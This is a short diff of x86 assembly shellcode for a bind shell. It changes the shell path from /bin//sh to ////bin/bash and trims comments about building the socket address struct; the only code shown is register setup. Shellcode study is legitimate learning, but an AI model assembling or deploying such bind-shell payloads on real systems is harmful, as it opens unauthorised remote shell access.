@@ -42,7 +42,7 @@
 ;
 ; We'll also have to redirect std in, out, error
 ; through the acceptfd in order to launch
-; /bin//sh
+; ////bin/bash
 ;
 ;---------------------------------------------------------------------------
 
@@ -90,11 +90,7 @@ call_bind:
         ;       sa_family_t sa_family;
         ;       char        sa_data[14];
         ;   }
-	;
-	; it appears we'll need something like this (AF_INET, Address, Port)
-	; for the struct. We'll have to use some stack magic and pointers
-	; to do so. Remember to reverse the order on the stack
-
+;
 	pop esi		; this should be our listening port JMP/CALL/POP
 	xor eax, eax	; clean out eax
 	xor ebx, ebx	; clean out ebx
